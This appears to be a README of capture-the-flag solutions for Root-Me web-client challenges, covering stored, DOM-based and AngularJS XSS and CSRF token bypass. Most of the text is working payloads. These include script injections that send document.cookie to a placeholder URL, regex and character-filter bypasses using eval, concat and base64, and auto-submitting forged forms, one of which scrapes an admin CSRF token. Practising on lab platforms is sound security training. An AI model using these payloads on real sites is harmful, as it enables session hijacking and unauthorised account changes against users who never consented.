# Rootme-App-Client
App Client Challenges Summary

### XSS- Stored 1
Post a message with content is the following:
`<script>window.location.href="URL?c="+document.cookie</script>
`
### XSS - Stored 2
Post a random message, then Ctrl + U to view source code. 

There are 2 style definitions : `invite` & `admin`.

Besides, when open cookies manage, we see a value of `status` is `invite`. 

Change this value into `admin` and try posting a message, this change will affect to tag `i` after message title.

So we're going to exploit this.

Change `status` cookie into `"><script>window.location.href="URL?c="+document.cookie</script>` and post a message

### XSS DOM Based - Introduction

Submit a random number, we will see url has a param `number`. 

Ctrl + U to view source code. `number` variable get value from URL param.

Exploit this.

Submit number `'; window.location.href="URL?c="+document.cookie//`. 

This will break `''` of `number` variable, add `fetch` into script.

Submit URL in `Contact` page with param `RootmeURL?number='; window.location.href="URL?c="+document.cookie//`

### XSS DOM Based - Eval
This web use regex  /^\d+[\+|\-|\*|\/]\d+/ to check input. We can bypass by using the following input:

``1*24+";window.location.href=`URL?c=`+document.cookie;//"``

### XSS DOM Based - Filters Bypass
This web filters `;` or `+`. So we use `concat` instead.

It also filters `https` to check redirect. 

``'.concat(eval('document.location=`//URL?c=${document.cookie}`'))//``

### XSS DOM Based - AngularJS
Create base64 of redirect command:

`btoa("window.location.href='URL?c='+document.cookie")`

Submit the following URL in `contact` page

``RootMeURL/?name={{constructor.constructor("eval(atob(`<base64>`))")()}} ``

### CSRF Token Bypass
Sample payload for bypassing CSRF Token:

```
<form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
                <input id="username" type="text" name="username" value="1337">
                <input id="status" type="checkbox" name="status" checked >
                <input id="token" type="hidden" name="token" value="" />
                <button type="submit">Submit</button>
</form>
<script>

                xhttp = new XMLHttpRequest();
                xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
                xhttp.send();

                // extraction du token
                token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));

                // insertion du token dans notre formulaire
                 document.getElementById('token').setAttribute('value', token_admin)

                // envoi du formulaire
                document.csrf_form.submit();
</script>
```

### CSRF - 0 protection

```
<iframe style="display:none" name="csrf-frame"></iframe>
    <form  id="csrf-form" target="csrf-frame" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="ad" />
      <input type="hidden" name="status" value="on" />
      <input type="submit" value="Submit request" />
    </form>
<script>document.getElementById("csrf-form").submit()</script>
```
